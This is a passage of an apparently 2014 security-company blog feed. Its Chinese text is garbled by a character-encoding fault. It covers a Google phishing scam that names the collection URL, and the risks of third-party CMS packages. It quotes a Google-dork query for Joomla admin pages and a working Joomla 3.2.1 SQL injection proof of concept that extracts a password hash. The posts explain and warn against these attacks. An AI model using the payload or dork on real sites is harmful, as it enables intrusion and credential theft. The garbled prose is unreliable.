&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signIn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signIn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rc-button rc-button-submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sign in&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÁôºÁèæ‰∫ÜÂóéÔºüÂÖ∂‰∏≠ form ÁöÑ action Ê¨Ñ‰ΩçË¢´Âèñ‰ª£Êàê„Äå&lt;strong&gt;http://cantonfair.a78.org/yahoo/post.php&lt;/strong&gt;„ÄçÔºåËÄåÈÄôÂÄãÈ†ÅÈù¢ÊúÉÁõ¥Êé•Êé•Êî∂ÂèóÂÆ≥ËÄÖËº∏ÂÖ•ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÔºå‰∏¶‰∏îËá™ÂãïË∑≥ËΩâÂà∞ÁúüÊ≠£ÁöÑ Google ÁôªÂÖ•È†ÅÈù¢„ÄÇÊîªÊìäËÄÖÂæû a78.org ÈÄôÂÄãÁ∂≤Á´ô‰∏≠Áõ¥Êé•ÂèñÂæóÊâÄÊúâË¢´Èß≠ÁöÑ‰∫∫Ëº∏ÂÖ•ÁöÑÂ∏≥ËôüÂØÜÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÂæàÁ∞°ÂñÆ„ÄÅÂÖ∏Âûã„ÄÅÂèàÊòìË¢´ÁôºÁèæÁöÑÈá£È≠öÊ°à‰æã„ÄÇÂ¶ÇÊûú‰∏ÄÊôÇ‰∏çÂØü‰∏çÂ∞èÂøÉËº∏ÂÖ•‰∫ÜÂ∏≥ËôüÂØÜÁ¢ºÔºå‰∏ãÊ¨°Â∏≥ËôüË¢´ÁõúÁöÑÂ∞±ÊòØËá™Â∑±„ÄÇÂª∫Ë≠∞Â§ßÂÆ∂Âú®Êî∂Âèñ‰ø°‰ª∂ÁöÑÊôÇÂÄôÈÅµÂæ™ÂπæÂ§ßÂéüÂâáÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;‰∏çÈö®‰æøÈñãÂïüÈôÑÂä†Ê™îÊ°àÔºöÈôÑ‰ª∂Â∏∏Â§æÂ∏∂ÊÉ°ÊÑèÁ®ãÂºè„ÄÅÂü∑Ë°åÊ™î„ÄÅÊÉ°ÊÑèÊñá‰ª∂„ÄÅÈá£È≠öÁ∂≤È†ÅÁ≠âÔºåÂàáÂãøÈö®‰æøÈñãÂïü„ÄÇÂèØ‰ΩøÁî® Google Docs ÈñãÂïüÈôÑ‰ª∂Êñá‰ª∂Èò≤Ê≠¢ÊÉ°ÊÑèÊñá‰ª∂ÊîªÊìä Adobe PDF Reader„ÄÅMicrosoft Office Á≠âÁ®ãÂºè„ÄÇÊõ¥Â∏∏ÊúâÊääÊÉ°ÊÑèÁ®ãÂºèÂä†ÂØÜÂ£ìÁ∏ÆÂæåÂØÑÂá∫ÔºåÂú®‰ø°‰∏≠ÈôÑ‰∏äÂØÜÁ¢ºÔºåÂÄüÊ≠§Ë¶èÈÅøÈò≤ÊØíËªüÈ´îÁöÑÂÅµÊ∏¨Ôºå‰∏çÂèØ‰∏çÊÖé„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê≥®ÊÑè‰ø°‰ª∂‰∏≠ÁöÑË∂ÖÈÄ£Áµê URLÔºöÈá£È≠ö‰ø°‰ª∂Â∏∏Âú®Ë∂ÖÈÄ£Áµê‰∏≠‰ΩøÁî®ÊÉ°ÊÑèÁ∂≤Á´ôÁöÑ URLÔºåÂú®ÈªûÈÅ∏‰πãÂâçÂãôÂøÖ‰ªîÁ¥∞Ê™¢Êü•ÔºåÊõ¥Ë¶ÅÂ∞èÂøÉ„ÄåGoog&lt;strong&gt;l&lt;/strong&gt;e„ÄçÂèä„ÄåGoog&lt;strong&gt;1&lt;/strong&gt;e„Äç‰πãÈ°ûÁöÑËã±ÊñáÊï∏Â≠óÂ∑ÆÁï∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê≥®ÊÑè‰ø°‰ª∂‰∏≠ÁöÑË™ûÊ∞£ÔºöÊúâÁöÑÊôÇÂÄôÊîªÊìäËÄÖ‰ªøÂÜí‰Ω†Ë∫´ÈÇäÂèØ‰ø°‰ªªÁöÑ‰∫∫ÂØÑ‰ø°Áµ¶‰Ω†Ôºå‰ΩÜÊòØË™ûÊ∞£„ÄÅÁî®Ë©ûË¶ÅÈùûÂ∏∏Á≤æÊ∫ñ„ÄÇÂ¶ÇÊûúÂá∫Áèæ‰∫Ü„Äå&lt;strong&gt;Â∞äÊï¨ÁöÑÁî®Êà∂ÊÇ®Â•Ω&lt;/strong&gt;„Äç‰Ω†Â∞±ÊúÉÁôºÁèæÈÄôÂÄãÊáâË©≤‰∏çÂ§™ÂÉèÊòØÂè∞ÁÅ£Êú¨ÂúüÁöÑ‰ø°‰ª∂Áî®Ë™û„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏çÂú®‰ø°‰ª∂‰∏≠Â§æÂ∏∂Ê©üÊïèË≥áÊñôÔºö‰ø°‰ª∂ÊòØ‰∏çÂÆâÂÖ®ÁöÑÔºåÂàáÂãøÂú®‰ø°‰∏≠ÊèêÂà∞Â∏≥Ëôü„ÄÅÂØÜÁ¢º„ÄÅÂÄãË≥áÁ≠âÊ©üÂØÜË≥áÊñô„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏çÂõûÊáâÈôåÁîüÈÉµ‰ª∂ÔºöÈÉµ‰ª∂‰∏≠ÊúÉÂ§æÂ∏∂Ëá™Â∑±ÁöÑ IP ‰ΩçÂùÄÔºåÂõûÊáâ‰ø°‰ª∂ÂèØËÉΩËÆìÊîªÊìäËÄÖÂæóÂà∞ÈÄô‰∫õË≥áÊñô„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®ÂÆâÂÖ®ÁöÑÈÉµ‰ª∂ËªüÈ´îÔºöËã•‰ΩøÁî®ÂÆâÂÖ®ÁöÑÈÉµ‰ª∂ËªüÈ´î„ÄÅÂπ≥Âè∞Ôºå‰æãÂ¶Ç GmailÔºåÈÅáÂà∞ÊÉ°ÊÑèÈÉµ‰ª∂ÊôÇÔºåÊúÉÂç≥ÊôÇÈòªÊìã‰∏¶‰∏îË≠¶ÂëäÁî®Êà∂„ÄÇÂ¶ÇÊûú‰ΩøÁî®Ëá™Â∑±ÁöÑÈÉµ‰ª∂ËªüÈ´îÔºåÂ∞±Ë¶ÅÁâπÂà•Ê≥®ÊÑèÈá£È≠öÁ≠âÊîªÊìä„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÈõªÂ≠êÈÉµ‰ª∂ÁöÑÊîªÊìäÂ∑≤Á∂ìÊàêÁÇ∫Êª≤ÈÄèÊîªÊìä‰∏ªË¶ÅÁöÑÊâãÊ≥ï‰πã‰∏ÄÔºå‰∏çÂ∞ëÂúãÈöõË≥áÂÆâ‰∫ã‰ª∂ÈÉΩÊòØËÇáÂõ†ÊñºÊÉ°ÊÑèÈÉµ‰ª∂„ÄÇ‰æãÂ¶Ç 2013 Âπ¥ÈüìÂúã DarkSeoul ‰∫ã‰ª∂Ôºå‰ª•ÂèäÁ´ÑÊîπ‰∫§ÊòìÂåØÊ¨æË≥áÊñôÈÉµ‰ª∂Ë©êÂèñÂåØÊ¨æÁ≠â„ÄÇË∫´ÁÇ∫ÁõÆÊ®ôÁöÑÊàëÂÄëÊõ¥Ë¶ÅÊôÇÊôÇÊ≥®ÊÑè‰ΩøÁî®ÈõªÂ≠êÈÉµ‰ª∂ÊôÇÁöÑÂÆâÂÖ®‰∫ãÈ†Ö„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/</link>
                <guid>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</guid>
                <pubDate>Mon, 31 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>‰ΩøÁî®Á¨¨‰∏âÊñπÂ•ó‰ª∂ÊâÄË¶ÅÊìîË≤†ÁöÑË≥áÂÆâÈ¢®Èö™</title>
                <description>&lt;p&gt;‰ΩøÁî®Á¨¨‰∏âÊñπÂ•ó‰ª∂ÁØÄÁúÅÈñãÁôºÊôÇÈñìÔºåÂ∑≤Á∂ìÊòØÊï¥ÂÄãË≥áË®äÁî¢Ê•≠ÁöÑÊÖ£‰æã„ÄÇ‰ΩÜÊòØÂæàÂ§öÁÆ°ÁêÜËÄÖÂèØËÉΩ‰∏çÁü•ÈÅìÔºå‰ΩøÁî®Á¨¨‰∏âÊñπÂ•ó‰ª∂Âà∞Â∫ïÈúÄË¶ÅÊìîË≤†Â§öÂ§ßÁöÑË≥áÂÆâÈ¢®Èö™„ÄÇ‰Ω†Á¢∫ÂÆö‰Ω†Áî®ÁöÑÂ•ó‰ª∂ÊòØÂÆâÂÖ®ÁÑ°ËôûÁöÑÂóéÔºüÊòØÂê¶ÊúâÁ∂ìÈÅéÂö¥Ë¨πÁöÑÂÆâÂÖ®Ê∏¨Ë©¶ÔºüËã•ÊúâÂÆâÂÖ®ÊºèÊ¥ûÂºïÁàÜÔºåÊòØÂê¶ÊúâÂª†ÂïÜÂèØ‰ª•Ë≤†Ë≤¨Á∂≠Ë≠∑‰øÆË£úÔºüÂª†ÂïÜÈñãÁôºÁöÑÁ®ãÂºèÁ¢ºÂìÅË≥™ÊòØÂê¶Á©©ÂÆöÔºüÈÄô‰∫õÈÉΩÊòØÂú®‰ΩøÁî®‰πãÂâçÂøÖÈ†àË¶ÅËÄÉÊÖÆÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®ÊúçÂãôÁúæÂ§öÂÆ¢Êà∂‰πãÂæåÔºåÊàëÂÄëÊ∑±Áü•ÈÄô‰∫õÂïèÈ°åÁöÑÂö¥ÈáçÊÄß„ÄÇ‰ª•‰∏ãÊàëÂÄëÂ∞áÂ∞±ÂπæÂÄãÁ∂ìÂÖ∏ÁöÑÊ°à‰æã‰æÜË™™Êòé‰ΩøÁî®Á¨¨‰∏âÊñπÂ•ó‰ª∂ÊâÄË¶ÅÊìîË≤†ÁöÑÈ¢®Èö™Ôºå‰∏¶‰∏îÂàÜ‰∫´ÊàëÂÄëÂ∞çÊñºÁ¨¨‰∏âÊñπÂ•ó‰ª∂ÁöÑÂÆâÂÖ®Âª∫Ë≠∞„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Á®ãÂºèÁ¢ºÁöÑÂÆâÂÖ®ÊÄß&quot;&gt;Á®ãÂºèÁ¢ºÁöÑÂÆâÂÖ®ÊÄßÔºü&lt;/h3&gt;

&lt;p&gt;Á®ãÂºèÁ¢ºÁöÑÂìÅË≥™Áõ¥Êé•Ê±∫ÂÆö‰∫ÜÁ≥ªÁµ±ÁöÑÂÆâÂÖ®ÊÄß„ÄÇÂ¶ÇÊûú‰∏ÄÂÄãÂ•ó‰ª∂Êúâ‰ª•‰∏ãÂπæÈªûÂõ†Á¥†Ôºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Á®ãÂºèÈñãÁôºÂ∑≤‰πÖÈõ£‰ª•‰øÆÊîπ&lt;/li&gt;
  &lt;li&gt;ÈñãÁôº‰∫∫Âì°ÁÑ°ÂÆâÂÖ®ËßÄÂøµ&lt;/li&gt;
  &lt;li&gt;Â§ßÈáèÊï¥ÂêàÂ§ñÈÉ®Â•ó‰ª∂ÔºåÁÑ°Ê≥ïÊéßÁÆ°ÊØèÂÄãÂ•ó‰ª∂ÂÆâÂÖ®&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÂèØËÉΩÂ∞±Âõ†ÁÇ∫Á®ãÂºèÁ¢ºÈõ£‰ª•‰øÆÊîπÔºåÂΩ¢ÊàêÊºèÊ¥ûÁôæÂá∫ÁöÑÁ®ãÂºèÊû∂Êßã„ÄÇËã•ÊòØ‰πãÂæåÈô∏Á∫åÁôºÁîüÂÆâÂÖ®ÂïèÈ°åÔºåÂÑòÁÆ°‰∏çÊñ∑ÁöÑ‰øÆË£úÊºèÊ¥ûÔºå‰ΩÜÂçªÊúÉÂõ†ÁÇ∫Á®ãÂºèÁ¢ºÁöÑË®≠Ë®à„ÄÅÊû∂ÊßãÁ≠âÂõ†Á¥†ÔºåÈÄ†ÊàêÊó•Âæå‰æùËàäÈô∏Á∫åÊúâÂÆâÂÖ®ÁñëÊÖÆ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ê°à‰æãË™™Êòédedecms&quot;&gt;Ê°à‰æãË™™ÊòéÔºöDedeCMS&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; ÊòØÁü•ÂêçÁöÑÂÖßÂÆπÁÆ°ÁêÜÁ≥ªÁµ±Ôºå‰∏çÂ∞ëÂÖ¨Âè∏ÊãøÊ≠§Â•ó‰ª∂Êû∂Ë®≠Á∂≤Á´ô„ÄÅÈÉ®ËêΩÊ†ºÁ≠â„ÄÇ‰ΩÜÂú®ÈÄôÂπæÂÄãÊúàÔºåÂú®„Äå&lt;a href=&quot;http://wooyun.org&quot;&gt;ÁÉèÈõ≤Âπ≥Âè∞&lt;/a&gt;„Äç‰∏äÈô∏Á∫åÊúâ‰∫∫Êè≠Èú≤ DedeCMS ÁöÑÊºèÊ¥û„ÄÇÂåÖÊã¨Â§ßÈáèÂêÑÁ®Æ SQL Injection„ÄÅCross-Site Scripting Âº±ÈªûÁ≠âÁ≠âÔºåÁîöËá≥ÈÇÑÂåÖÊã¨ Command Execution ÂïèÈ°å„ÄÇÂ¶ÇÊûúÊ≤íÊúâÂç≥ÊôÇ‰øÆÊ≠£ÈÄô‰∫õÂïèÈ°åÔºåÂ∞èÂâáÈÄ†ÊàêÁî®Êà∂Â∏≥ËôüË¢´ÁõúÔºåÂ§ßÂâáÈÄ†ÊàêÊï¥Âè∞‰∏ªÊ©üË¢´ÂÖ•‰æµÔºåÂèñÂæó‰ΩúÊ•≠Á≥ªÁµ±Ê¨äÈôê„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot; alt=&quot;ÁÉèÈõ≤ÊºèÊ¥ûÂ†±ÂëäÂπ≥Âè∞&quot; title=&quot;ÁÉèÈõ≤ÊºèÊ¥ûÂ†±ÂëäÂπ≥Âè∞&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰ªÄÈ∫ºÁ≥ªÁµ±Ê≤íË¢´ÊâæÂà∞ÊºèÊ¥ûÈÅéÂë¢ÔºüÊúâÈÇ£È∫ºÂö¥ÈáçÂóéÔºü‰ΩÜË©≤Á≥ªÁµ±Â∑≤Á∂ì‰∏çÂè™‰∏ÄÊ¨°Âá∫ÁèæÈáçÂ§ßÊºèÊ¥ûÂ∞éËá¥‰ºÅÊ•≠ÈÅ≠Âà∞ÂÖ•‰æµÔºåÂú®‰ªäÂπ¥‰∏Ä‰∫åÊúà‰ªΩÊõ¥ÊòØÈÅ≠Êè≠Èú≤Â§öÈÅîÂçÅÊï∏ÂÄãÈ´òÈ¢®Èö™ SQL Injection Ë≥áÊñôÂ∫´Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇÊ≠§ÁèæË±°Âá∏È°ØË©≤Â•ó‰ª∂ÁöÑË®≠Ë®à‰∏¶Êú™Á∂ìÈÅéÂÆâÂÖ®Ê∏¨Ë©¶Ôºå‰∏¶‰∏îÊé°Áî®‰∏çÂÆâÂÖ®ÁöÑÁ®ãÂºèÊí∞ÂØ´ÊñπÂºèÔºåÊú™‰æÜÂèØËÉΩÊúÉÊúâÊõ¥Â§öÈö±Âê´ÁöÑÊºèÊ¥ûÈáãÂá∫„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot; alt=&quot;dedecmsÊºèÊ¥ûÊñºÁÉèÈõ≤Âπ≥Âè∞&quot; title=&quot;dedecmsÊºèÊ¥ûÊñºÁÉèÈõ≤Âπ≥Âè∞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âú®Âπ≥Âè∞‰∏≠ÊêúÂ∞ãÈóúÈçµÂ≠ó„ÄåDedeCMS„ÄçÔºåÊúÉÁôºÁèæÊºèÊ¥ûÊèêÂ†±ÁöÑÊ¨°Êï∏Áõ∏Áï∂Â§öÔºåÂú®ÊºèÊ¥ûÁöÑË©ïË´ñ‰∏≠‰πüÊúâ‰∏çÂ∞ëÊäÄË°ì‰∫∫Âì°ÈÄ≤Ë°åË®éË´ñ„ÄÇ‰ΩÜÊõ¥Â§öÁöÑÁñëÊÉëÊòØÁÇ∫‰ªÄÈ∫º DedeCMS ÊúÉ‰∏ÄÂÜçÁöÑÁôºÁîüË≥áÂÆâÂïèÈ°å„ÄÇ‰æãÂ¶Ç‰ª•‰∏ãÊºèÊ¥ûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-052010&quot;&gt;DedecmsÊüêÂëΩ‰ª§Âü∑Ë°åÊºèÊ¥û&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051950&quot;&gt;DedeCMSÂÖ®ÁâàÊú¨ÈÄöÊÆ∫SQLÊ≥®ÂÖ•(ÁúüÊ≠£ÁöÑÁÑ°‰ªª‰ΩïÈôêÂà∂ÈôÑÂÆòÊñπÊ∏¨Ë©¶ÁµêÊûú)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051889&quot;&gt;DedeCMSÂÖ®ÁâàÊú¨ÈÄöÊÆ∫SQLÊ≥®ÂÖ•(ÁÑ°‰ªª‰ΩïÈôêÂà∂)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;DedecmsÊüêÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºàÁª≠Ôºâ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot; alt=&quot;dedecmsÊºèÊ¥ûÊñºÁÉèÈõ≤Âπ≥Âè∞&quot; title=&quot;dedecmsÊºèÊ¥ûÊñºÁÉèÈõ≤Âπ≥Âè∞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÊñºÂè¶‰∏ÄÂÄã„Äå&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug ÂÆâÂÖ®ÊºèÊ¥û‰ø°ÊÅØÂ∫´&lt;/a&gt;„Äç‰πüÂèØ‰ª•ÁúãÂà∞‰∏çÂ∞ë DedeCMS ÁöÑËπ§ÂΩ±„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot; alt=&quot;sebugÂÆâÂÖ®ÊºèÊ¥û‰ø°ÊÅØÂ∫´&quot; title=&quot;sebugÂÆâÂÖ®ÊºèÊ¥û‰ø°ÊÅØÂ∫´&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÂÆòÊñπÂú®Á¨¨‰∏ÄÊôÇÈñìÂ∞±ËÉΩÊé•Áç≤ÈÄöÂ†±„ÄÅ‰∫ÜËß£ÂïèÈ°å‰∏¶‰øÆÊ≠£Ëß£Ê±∫ÔºåÊèê‰æõÊõ¥Êñ∞Á®ãÂºèÁµ¶ÂÆ¢Êà∂Êõ¥Êñ∞ÔºåÈÇ£ÂÆâÂÖ®ÁöÑÈ¢®Èö™ÊúÉÂ∞è‰∫õ„ÄÇ‰ΩÜÂú®ÂÆòÊñπÂ∞öÊú™ÈáãÂá∫Êõ¥Êñ∞ÁöÑÈÄôÊÆµÊôÇÈñìÔºåÁ∂≤Á´ôÂ∞áÂÆåÂÖ®ÁöÑÊö¥Èú≤Âú®È¢®Èö™Áï∂‰∏≠„ÄÇÊúâÂøÉ‰∫∫Â£´ÁúãÂà∞Â•ó‰ª∂ÁöÑÊºèÊ¥ûÈô∏Á∫åË¢´Êè≠Èú≤Ôºå‰πüÊúÉÊõ¥ÊúâËààË∂£Â∞ãÊâæ‰ΩøÁî®Ë©≤Â•ó‰ª∂ÁöÑÁ∂≤Á´ôÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Ê°à‰æãË™™Êòéjoomla&quot;&gt;Ê°à‰æãË™™ÊòéÔºöJoomla!&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt; ÊòØÂè¶‰∏ÄÂ•óÂúãÈöõÈùûÂ∏∏Áü•ÂêçÁöÑ CMS Á≥ªÁµ±ÔºåÂõ†ÁÇ∫ÂÖ∂‰æøÂà©ÊÄßÔºåÂæàÂ§ö‰ºÅÊ•≠„ÄÅÂ≠∏Ê†°„ÄÅÊîøÂ∫úÂñÆ‰ΩçÔºåÈÉΩÊé°Áî®Ê≠§Â•ó‰ª∂Âª∫Á´ãÁ∂≤Á´ô„ÄÇÈÄèÈÅé Google Hacking ÊñπÂºèÂèØ‰ª•ÊâæÂà∞Âè∞ÁÅ£ÈùûÂ∏∏Â§öÁ∂≤Á´ôÈÉΩ‰ΩøÁî® Joomla! Êû∂Á´ô„ÄÇ&lt;/p&gt;

&lt;pre&gt;
site:tw intitle:ÁÆ°ÁêÜÂçÄ inurl:administrator
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking Â∞ãÊâæ Joomla!&quot; title=&quot;Google Hacking Â∞ãÊâæ Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÊòØÂ¶ÇÊûú‰ªäÂ§©ÈÄôÂÄãÁ≥ªÁµ±Âá∫‰∫ÜÂïèÈ°åÂë¢Ôºü„ÄåJoomla!„ÄçÂõ†ÁÇ∫Â§ñÊéõ„ÄÅÂ•ó‰ª∂ÁúæÂ§öÔºå‰πüÁ∂ìÂ∏∏ÊàêÁÇ∫ÊºèÊ¥ûÁôºÊéòÁöÑÂ∞çË±°„ÄÇÂú® 2014/02/05ÔºåÂúãÂ§ñÈáãÂá∫‰∫Ü‰∏ÄÂÄã SQL Injection ExploitÔºåÂèØ‰ª•Â∞éËá¥Á∂≤Á´ôÂ∏≥ËôüÂØÜÁ¢ºÁõ¥Êé•Ë¢´Â∞éÂá∫„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÆòÊñπÂÆâÂÖ®ÂÖ¨ÂëäÔºö&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Secunia: Joomla! Multiple Vulnerabilities &lt;a href=&quot;http://secunia.com/advisories/56772/&quot;&gt;http://secunia.com/advisories/56772/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploit ‰ΩçÂùÄÔºö&lt;a href=&quot;http://www.exploit-db.com/exploits/31459/&quot;&gt;http://www.exploit-db.com/exploits/31459/&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=&amp;gt;
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
¬†
will cause an error:
¬†
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\)&apos; at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = &apos;com_weblinks.categories&apos; AND `m`.`content_item_id` IN ( \) Array ( [type] =&amp;gt; 8 [message] =&amp;gt; Undefined offset: 0 [file] =&amp;gt; /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] =&amp;gt; 203 )
¬†
I modified the original error.php file with this code --- &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php print_r(error_get_last()); ?&amp;gt;&lt;/span&gt; --- in order to obtain something useful. ;-)
¬†
Now i can easily exploit this flaw:
¬†
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
¬†
1054 Unknown column &apos;$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1&apos; in &apos;where clause&apos; SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` &lt;span class=&quot;nt&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` &lt;span class=&quot;nt&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &apos;com_weblinks.categories&apos;) AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
¬†
CheerZ&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂÄºÂæóÊ≥®ÊÑè‰∏ÄÁúãÁöÑÊòØ&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;ÂÆòÊñπÂÖ¨Âëä&lt;/a&gt;Ôºå‰∏äÈù¢Ê®ôË®ªËëóÊºèÊ¥ûÂõûÂ†±ÊôÇÈñì‰ª•Âèä‰øÆË£úÊôÇÈñì„ÄÇ2014/2/6 Êé•Áç≤ÂõûÂ†±Ôºå2014/3/6 ‰øÆÂæ©„ÄÇÂú®ÈÄôÊï¥Êï¥‰∏ÄÂÄãÊúàÁöÑÊôÇÈñì‰πãÂÖßÔºåÊâÄÊúâÈÅ©Áî®ÁâàÊú¨ÂÖßÁöÑ Joomla! Á∂≤Á´ôÈÉΩÂ∞áÂèóÊ≠§ÊºèÊ¥ûÂΩ±Èüø„ÄÇÂõ†Ê≠§Â•ó‰ª∂Âª†ÂïÜÁöÑÂèçÊáâ‰øÆÂæ©ÈÄüÂ∫¶Ë∂äÊÖ¢ÔºåÈ°ßÂÆ¢Êö¥Èú≤Âú®È¢®Èö™‰πã‰∏≠ÁöÑÊôÇÈñìË∂äÈï∑„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;Ê°à‰æãË™™ÊòéÂ§ñÂåÖÂª†ÂïÜ&quot;&gt;Ê°à‰æãË™™ÊòéÔºöÂ§ñÂåÖÂª†ÂïÜ&lt;/h3&gt;

